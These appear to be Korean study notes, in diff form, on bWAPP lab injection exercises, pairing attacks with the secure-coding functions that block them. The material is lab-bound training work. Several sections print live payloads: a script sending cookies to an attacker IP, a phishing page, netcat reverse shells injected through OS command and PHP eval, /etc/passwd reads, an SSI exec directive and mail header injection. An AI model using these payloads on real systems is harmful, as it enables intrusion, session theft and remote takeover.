@@ -1,0 +1,684 @@
+6강.LDAP Connection Settings 보류 나중에 꼭 풀어 볼것
+
+
+
+
+
+
+비박스
+
+ssh 
+id  :	bee
+pw :	bug
+
+비박스는 
+cd /var/www/bWAPP
+
+에서 코드를 확인 할 수 있다. 
+파일을 찾아서 함수로 보안코드를 확인하면 된다.
+
+part1 - html injection 공격
+
+
+html , sql  , php , xml , javascript 등 있다.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+1강.get방식
+bWAPP Injection - HTML Injection - Reflected(GET)
+
+GET 방식 : Header에 정보(변수)를 포함시킴, 그렇기 때문에 주소창(URL)에 서버로 넘어가는 정보가 보임
+
+ 
+get 방식에서 가장 많이 사용하는 것은 바로 피싱이다. 
+get은 주소에서 값을 받는 형태가 나타남으로 url을 이용하여
+쿠키를 빼내거나 가짜 사이트를 만들어서 설치를 유도하여 
+상대의 시스템을 점령하는 방법이다.
+
+여러 상황이 있겠지만 한가지 정의해보자
+
+
+1-1. 피싱 메일
+전제조건 사용자가 로그인해있어야한다.
+
+1.해커는 웹페이지를 하나 만든다
+
+해커의 사이트
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<script>
+
+    function button() {
+
+        location.href="http://192.168.88.128/bWAPP/htmli_get.php";
+
+    }
+
+</script>
+
+<?php
+if( isset( $_GET[ 'cookie' ] ) ) {
+
+echo "<p><img src='' width='300px' height='300px' onclick='button()'> 잘 만들어진 광고사이트(광[>
+echo "<p>사진을 누르면 본래 페이지로 돌아갈 것이라고 버튼 클릭</p>";
+
+}
+?>
+
+</body>
+</html>
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+2.피싱메일을 준비한다
+쿠키값을 해커의 웹페이지로 보내는 자바스크립트 삽입
+<script>location.href="http://192.168.36.129/aaa.php?cookie="+document.cookie;</script>
+url이나 이미지에 교묘히 넣어 클릭을 유도한다
+
+3.여러가지 경우가 있겠지만 단순 광고로 속였다 치자
+사용자는 광고를 확인하기 위해 웹페이지에 들어가는 순간 쿠키값은 털리고
+웹페이지에서 사이트로 돌아가기 를 누르므로써 사용자는 진짜 본 사이트에서 온 광고인줄 알게된다.
+
+
+4.해커의 운영체제에는 쿠키값이 보내진다.
+
+sudo cat /var/log/apache2/access.log
+sudo tail -f cat /var/log/apache2/access.log
+이 명령어로 확인 가능하다
+
+
+
+
+
+1-2.사이트 조작
+iframe 이나 버튼,이미지등을 마치 원래부터 있던 거처럼 하는 넣어 피싱하거나 Stored 경우 그대로 두어 이용자들을 속이는 행위
+
+
+
+보안을 살펴보자
+sudu nano htmli_get.php
+sudu nano functions_external.php
+
+
+#middle
+function xss_check_1($data)
+{
+
+    // Converts only "<" and ">" to HTLM entities
+    $input = str_replace("<", "&lt;", $data);
+    $input = str_replace(">", "&gt;", $input);
+
+    // Failure is an option
+    // Bypasses double encoding attacks
+    // <script>alert(0)</script>
+    // %3Cscript%3Ealert%280%29%3C%2Fscript%3E
+    // %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E
+    $input = urldecode($input);
+
+    return $input;
+    
+}
+
+
+<와 > 를 16진법으로 바꾸는 방법 
+그러나
+<script>alert(0)</script> 이는 막을 수 있으나
+%3Cscript%3Ealert%280%29%3C%2Fscript%3E 아예 16진법으로 url 대체코드로 쓰면 뚫린다
+
+
+
+
+#high
+function xss_check_3($data, $encoding = "UTF-8")
+{
+
+    // htmlspecialchars - converts special characters to HTML enti$
+    // '&' (ampersand) becomes '&amp;'
+    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is no$
+    // "'" (single quote) becomes '&#039;' (or &apos;) only when E$
+    // '<' (less than) becomes '&lt;'
+    // '>' (greater than) becomes '&gt;'
+
+    return htmlspecialchars($data, ENT_QUOTES, $encoding);
+
+}
+
+원리는 들어온 값을 utf-8로 복호화 함으로써 url 대체코드가 들어오는 것을 막는다.
+
+
+
+결론
+모든 폼값에 인젝션 공격이 작동되어서는 안되고
+url 대체코드도 작동이 되지 않도록 막아야 한다 
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2강.post방식
+POST 방식 : Body에 정보(변수)를 포함시킴, 그렇기 때문에 주소창(URL)에 서버로 넘어가는 정보가 안보임
+
+위 경우는 주소창에 서버로 넘어가는 정보가 보이지 않기 때문에 피싱유도는 힘들고 
+보통은 stored 가 가능한 페이지에서 사이트를 조작하는 방법으로 사용한다 
+
+
+get과 많이 다르지 않으니 pass 
+보안도 똑같다
+
+
+sudu nano htmli_post.php
+sudu nano functions_external.php
+
+1강 get 방식과 같은 함수이다
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+3강.Reflected(Current URL)
+
+취약점은 틀에 막힌 생각에 당연히 봐야하는데 보지 못한 곳에서 발생한다.
+3강의 웹페이지는 현재의 url 을 출력하는 사이트이다.
+이 경우에도 출력을 받는 변수는 시큐어 코딩이 되어있어야 하는데
+언뜻 보아서는 url에다가 직접 치고 들어간다고 인젝션 공격이 되는 것도 아니고
+페이지 내에서는 값을 입력하고 받아 줄 변수가 없기 때문에 문제 없어 보이지만
+버프스위트 같은 툴이나 패킷을 가로챌 경우는 다르다
+이용자가 출력에 개입하지 못하는 것 뿐 
+패킷내에서는 출력에 관해서 값을 주고 받는 패킷이 있기 때문에
+이를 조작하면 공격이 가능하며 stored 같은 경우는 위 방법으로 사이트를 조작한다 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+4강.Injection - Stored(Blog)
+
+Reflected 방식
+공격자가 태그/스크립트를 삽입한 URL을 클라이언트가 사용했을 경우, 서버로 HTTP 요청을 보내고 응답 받을시
+태그/스크립트가 클라이언트에서 실행되는 방식
+그렇기 때문에 클라이언트는 실제 웹 싸이트 접근이 아닌 피싱 사이트로 접속되는 문제가 발생할 수 있다.
+공격자가 악의적인 URL을 유포하는 방법 : 이메일, 게시판에 URL 링크 정보 노출, SNS를 통해서 URL 링크 정보 노출
+Ex) URL 클릭시 : 피싱 사이트 접속 이후 개인 정보 유출, 바탕화면에 쓸때 없는 아이콘 생성 및 불필요한 프로그램 설치
+
+>> 태크나 스크립트가 저장되지 않음
+ 
+
+
+Stored 방식
+공격자가 서버(게시판)에 태그/스크립트를 저장시켜, 클라이언트가 게시판을 읽을 경우 태그/스크립트가 실행되는 방식
+Ex) 게시판을 읽을 경우 : 쿠기 정보 갈취, 악성 코드 유입, 랜섬웨어, 피싱 사이트 접속, 불필요한 프로그램 설치
+
+>> 태크나 스크립트가 저장된다.
+
+사이트를 마치 기존의 사이트처럼 조작한다
+https://net123.tistory.com/445?category=695510 
+에서 처럼 
+<form>을 넣거나 (값을 해커의 사이트로...)
+<img>
+<button> 
+<script> 을 넣는다
+
+
+이는 dvwa에서 11.XSS (Stored) 에서 학습했으므로 간단히 넘어감
+
+보안 시큐어코딩은 1강에서의 함수와 동일하다
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+5강.iframe Injection
+
+iframe 이 프론트 엔드에 노출된다면 주의해야 한다.
+조작할 수 있기 때문이다
+
+원본 : <iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>
+조작 : <iframe frameborder="0" src="http://192.168.36.129/b.php?cookie" height="10" width="10"></iframe>
+
+
+위에서의 공격들과 마찬가지로 reflected 일 경우는 피싱 stored 일 경우는 사이트 조작으로 이용한다.
+한가지 봐야할 것은 사이트 조작이라는 것이 단순한 마치 원래 사이트인 것처럼 조작하는 것이 아닌
+쿠키값을 보내는 용도로도 사용할 수 있다는 것이다.
+일단 
+해커는 alert창이나 기타 다른 방법을 이용하여 쿠키값을 해커의 사이트로 보내는 페이지를 만들고 
+피싱이나 사이트 조작을 이용하여 상대의 쿠키값을 받아올 수 있다
+
+보안 코드는 위 강의들과 같다
+iframe 의 src 나 모든 설정 조항들에 htmlspecial() 을 걸어두는 것이다
+
+
+
+
+if(!(isset($_GET["ParamUrl"])) || !(isset($_GET["ParamHeight"])) || !(isset($_GET["ParamWidth"])))
+{
+    header("Location: iframei.php?ParamUrl=robots.txt&ParamWidth=250&ParamHeight=250");
+    exit;
+}
+
+ 
+
+
+한가지 더 보고 가자!
+'robots.txt'
+ 검색 엔진을 통해서 정보를 검색하는 것을 제어할때 사용하는 파일이다.
+
+만약, 중요한 디렉토리, 파일들이 검색이 된다면, 디렉토리 리스팅에 의해서 정보가 노출되는 문제가 발생한다.
+또한, 'robots.txt' 파일은 웹-서버 홈 디렉터리에 생성하고 관리해야 한다.
+명령어 형식은 다음과 같다.
+
+ 
+
+
+User-agent : * 		모든 검색 엔진
+
+User-agent: googlebot	구글 검색 엔진
+
+Allow: /			모든 디렉토리 접근 허용
+
+Disallow: abc.ini		'abc.ini' 파일 검색 차단
+
+Disallow: /admin/		'admin' 디렉터리 접근 차단
+
+Disallow:			사이트 크롤링 가능
+
+
+
+ex)
+User-agent: GoodBot
+Disallow:
+
+User-agent: BadBot
+Disallow: /
+
+User-agent: *
+Disallow: /admin/
+Disallow: /documents/
+Disallow: /images/
+Disallow: /passwords/
+
+
+'GoodBot' 봇은 사이트 크롤링을 가능하다.
+'BadBot' 봇은 모든 디렉토리 접근이 불가능하다.
+모든 봇들은 /admin/, /documents/, /images/, /passwords/ 디렉토리 접근이 불가능하다.
+
+ 
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+6강.LDAP Connection Settings
+
+LDAP란?
+X.500을 근거로 한 디렉터리 베이스에 접속하기 위한 통신 규약. 디렉터리 정보의 등록, 갱신, 삭제와 검색 등을 실행할 수 있다.
+경량 디렉터리 액세스 프로토콜, TCP/IP 위에서 디렉터리 서비스를 조회하고 수정
+
+
+이 강의는 보류 자료가 없음
+https://www.youtube.com/watch?v=CZr1kGP-Xoo
+
+너무 복잡한 문제에 가깝기 때문에....나중에 풀어볼것
+
+
+
+
+
+보안 코드의 특징을 살펴보면
+*사용자 입력 값을 화이트 리스트로 지정하여 영문(a-z, A-Z)과 숫자(0-9)만을 허용
+* DN과 필터에 사용되는 사용자 입력 값에는 특수문자가 포함되지 않도록 특수문자 제거
+* 특수문자를 사용해야 하는 경우 특수문자(DN에 사용되는 특수문자는 '\', 필터에 사용되는 
+특수문자는( =, +, <, >, #, ;, \ 등)에 대해서는 실행 명령이 아닌 일반문자로 인식되도록 처리
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+7강.Mail Header Injection (SMTP)
+공격자가 메시지에 추가 헤더를 삽입하여 메일서버가 의도한 것과 다르게 동작하도록 지시하는 것으로 
+이 페이지에서는 이메일 헤더에 cc(참조)나 Bcc(숨은 참조)를 추가하여 관리자에게만 보내는 
+메일을 다른 사람들에게 참조를 하여 메일을 보낼 수 있는 취약점
+
+bwapp@mailnator.com으로 이메일을 보내라...
+E-mail칸에 bwapp@mailnator.com을 채워야겠지만
+bwapp@mailnator.com%0ACc:bwapp1@naver.com   ->   Cc: 참조
+bwapp@mailnator.com%0ABcc:bwapp2@naver.com   ->   Bcc: 숨은 참조
+이렇게 입력하면 bwapp1과 bwapp2에게도 메일이 간다
+
+
+
+
+
+function maili_check_1($data)
+{
+
+    // URL decoding %0A -> \n and %0D -> \r
+    $input = urldecode($data);
+
+    $input = str_replace("\n", "", $input);
+    $input = str_replace("\r", "", $input);
+    $input = str_replace("bcc:", "", $input);
+//url 대체코드를 입력시 우회할 수 있다
+    return $input;
+    
+}
+
+
+
+
+function maili_check_2($data)
+{
+
+    // URL decoding %0A -> \n and %0D -> \r
+    $input = urldecode($data);
+//디코더 해서 인코딩을 입력할 수 없게 만들고
+    $input = filter_var($input, FILTER_SANITIZE_EMAIL);
+//값이 이메일 형식에 맞지만 이메일에 사용할 수 없는 문자들을 삭제한다
+    return $input;
+
+}
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+8강.OS Command Injection 
+9강.OS Command Injection - Blind
+
+
+8강.OS Command Injection 
+웹페이지의 기능에서 cmd나 터미널의 기능을 값을 받아 사용하는 모든 경우에는 값이 조작될 시 서비스하는 서버가 해커에게
+잠식 당할 수 있다
+
+
+| (파이프라인)
+앞에서 실행한 명령어 출력 결과를 뒤에서 실행하는 명령어 입력값으로 처리함
+
+; (세미콜론)
+한개의 라인에 여러개 명령어를 수행해줌
+
+&& (더블 엠퍼센트)
+첫 번째 명령어가 성공되면 다음 명령어를 수행함(단, 실패시 다음 명령어 수행 X)
+
+|| (더블 버티컬바)
+첫 번째 명령어가 실패해도 다음 명령어를 수행함(단, 성공시 다음 명령어 수행 X)
+
+ 
+
+function commandi_check_1($data)
+{
+    $input = str_replace("&", "", $data);
+    $input = str_replace(";", "", $input);
+    return $input;  
+}
+
+//모든 특수 문자를 막지 못했다
+ 
+
+function commandi_check_2($data)
+{
+    return escapeshellcmd($data);
+}
+
+
+
+
+escapeshellcmd()
+인자로 받은 명령어가 실행되었을 때, 의도하지 않았던 쉘 명령어가 실행되는 것을 방지
+Ex) 메타케릭터에 역슬레시(\)를 붙여 명령어를 실행하지 못하게 함
+
+뿐만아니라 ip 면 ip 메일이면 메일 받아야하는 값의 형식을 확실히 검사하는 것도 좋은 방법이다
+
+
+
+
+9강.OS Command Injection - Blind
+
+
+   <?php
+    if(isset($_POST["target"]))
+    {
+        $target = $_POST["target"];
+        if($target == "")
+        {
+            echo "<font color=\"red\">Please enter your IP address...</font>";
+        }
+        else
+        {
+            echo "Did you captured our GOLDEN packet?";
+
+            if(PHP_OS == "Windows" or PHP_OS == "WINNT" or PHP_OS == "WIN32")
+            {
+                shell_exec("ping -n 1 " . commandi($target));
+            }
+   else
+            {
+                shell_exec("ping -c 1 " . commandi($target));
+            }
+        }
+    }
+?>
+
+실행된 결과를 직접 보여주지 않는 것이다. 그러나 
+cat /etc/passwd 같은 공격이 안되는 거지 기존의 공격들은 전부 가능하다
+
+
+1.sudo nc -vlp 5656	
+>>	칼리 리눅스에서 넷켓을 사용하여 5656 포트를 연다
+
+2.아무 ip&& nc -vn 칼리ip 5656 -e /bin/bash
+ex)
+127.0.0.1&& nc -vn 192.168.36.129 5656 -e /bin/bash
+
+>>	위 코드를 삽입하여 칼리리눅스에 접근하였다. (칼리 리눅스 IP : 192.168.37.128)
+
+3.이것으로 칼리리눅스는 비박스를 원격제어 할 수 있게 되었다.
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+10강.php code injection 
+php 에 eval() 에 의해 발생한다
+eval() 함수는 안에 들어 있는 것이 문자열이더라도 문자열이 아닌 명령으로 인식한다.
+
+http://192.168.30.128/bWAPP/phpi.php?message=test
+....
+<h1>PHP Code Injection</h1>
+<p>This is just a test page, reflecting back your <a href="/bWAPP/phpi.php?message=test">message</a>...</p>
+.....
+
+
+위 코드를 보면 알 수있듯이 php 변수부분을 조작하는 방법을 이용한다.
+http://192.168.30.128/bWAPP/phpi.php?message=test; system('cat /etc/passwd | head -3')
+
+
+--------------------------------------------------------------------------------------
+메타스포일리잇-리버스 tcp 바이드 tcp 넷켓을 이용해보자
+
+칼리
+nc -lp 4444
+
+비박스
+http://192.168.30.128/bWAPP/phpi.php?message=test; system('nc 192.168.218.129 4444 -e /bin/bash')
+종종 안되는 경우가 있는데 이는
+-e 옵션이 비활성화되어 설치됐기 때문에 Attacker에 리버스연결을 할 수 없는 거라고 한다
+
+공격 클라이언트에 위 업데이트가 되어 있어야한다.
+sudo apt-get install netcat-traditional 
+sudo update-alternatives --config nc
+  2            /bin/nc.traditional   10        수동 모드    << 이걸 선택한다.
+!!!!!끝나면 다시 자동모드0  으로 바꿔놔라! 보안 취약하다
+
+그래도 공부해보려고 깔아서 해보려는데 안된다?
+우선 apt, apt-get 의 프로세스를 모두 죽이자
+
+sudo killall apt apt-get
+sudo rm /var/lib/apt/lists/lock
+sudo rm /var/cache/apt/archives/lock
+sudo rm /var/lib/dpkg/lock*
+
+
+
+칼리
+whoami
+
+pwd
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+터미널 접속됨!
+-----------------------------------------------------------------------------------------------
+
+
+
+보안코드
+
+<?php
+
+if(isset($_REQUEST["message"]))
+{
+    // If the security level is not MEDIUM or HIGH
+    if($_COOKIE["security_level"] != "1" && $_COOKIE["security_level"] != "2")
+    {
+?>
+    <p><i><?php @eval ("echo " . $_REQUEST["message"] . ";");?></i></p>
+
+//eval()함수를 쓰는것은 미친짓이다 ... 편리성을 얻는 대신 보안의 질을 너무나 낮춘다.
+//쓰지 않는 것이 좋다
+<?php
+    }
+    // If the security level is MEDIUM or HIGH
+    else
+    {
+?>
+    <p><i><?php echo htmlspecialchars($_REQUEST["message"], ENT_QUOTES, "UTF-8");;?></i></p>
+//그러나 꼭 써야한다면 htmlspecialchars() 을 인코딩을 못하게 하여 사용하는 것이 좋다!
+
+
+<?php
+    }
+}
+?>
+
+
+
+
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+11강. Server-Side Included(SSI) Injection
+ 
+
+SSI : Server Side Includes
+HTML 페이지 전체코드를 수정하지 않고 공통 모듈파일로 관리하여 동적인 내용을 추가하는 기능을 수행함
+SSI를 사용하는 웹페이지는 SSI를 처리하기 위한 .shtml 파일을 생성함
+만약, SSI를 사용하지 않는 브라우저라면 SSI를 주석으로 처리함
+Ex) 방문자 수 누적, 홈페이지 로고 수정
+
+
+Injection - SSI Injection
+
+웹-페이지 접속시 URL에 .shtml 파일이 보이면 SSI 기능을 사용하는 웹-페이지이다.
+이 시나리오는 SSI 기능을 사용하는 웹-페이지로 파악한 이후, SSI 지시어를 인젝션하여 시스템 정보 및 명령어를 실행
+하는 내용이다.
+ 
+
+
+view-source:http://192.168.30.128/bWAPP/ssii.php
+.....
+ <form action="/bWAPP/ssii.php" method="POST">
+
+        <label>Choose your bug:</label><br />
+.....
+
+
+
+view-source:http://192.168.30.128/bWAPP/ssii.shtml
+   {
+        $line = '<p>Hello ' . $firstname . ' ' . $lastname . ',</p><p>Your IP address is:' . '</p><h1><!--#echo var="REMOTE_ADDR" --></h1>';
+        // Writes a new line to the file
+        $fp = fopen("ssii.shtml", "w");
+        fputs($fp, $line, 200);
+        fclose($fp);
+        header("Location: ssii.shtml");
+        exit;
+    } 
+
+자신의 파일을 열어서 써놓는 방식이다
+<h1><!--#echo var="REMOTE_ADDR" --></h1> 이는 ssi 언어이다.
+이 부분을 ssi 문법으로 다른 명령어를 넣으면
+
+<!--#exec cmd="cat /etc/passwd" -->
+
+실행된다
+
+
+
+보안코드
+
+
+
+function xss_check_4($data)
+{
+    // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
+    // These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
+    // Do NOT use this for XSS or HTML validations!!!
+    return addslashes($data);
+}
+
+//특수 문자(', ", \) 앞에 \(역슬래시)를 삽입하여 특수문자 기능을 문자로 이스케이프하는 함수
+//역슬래쉬 이용하여 막으므로써 특수문자를 이용하지 못하게 하려고 했으나 위경우 
+//대체코드에 쓰레기값을 넣으면 뚫릴수도 있다.
+
+
+ function xss_check_3($data, $encoding = "UTF-8")
+{
+    // htmlspecialchars - converts special characters to HTML entities   
+    // '&' (ampersand) becomes '&amp;'
+    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
+    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
+    // '<' (less than) becomes '&lt;'
+    // '>' (greater than) becomes '&gt;' 
+    return htmlspecialchars($data, ENT_QUOTES, $encoding);
+
+//인코딩해서 변수를 htmlspecialchars() 를쓰는 것이 확실한 방법이다
+}
+
+ 
+
+
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
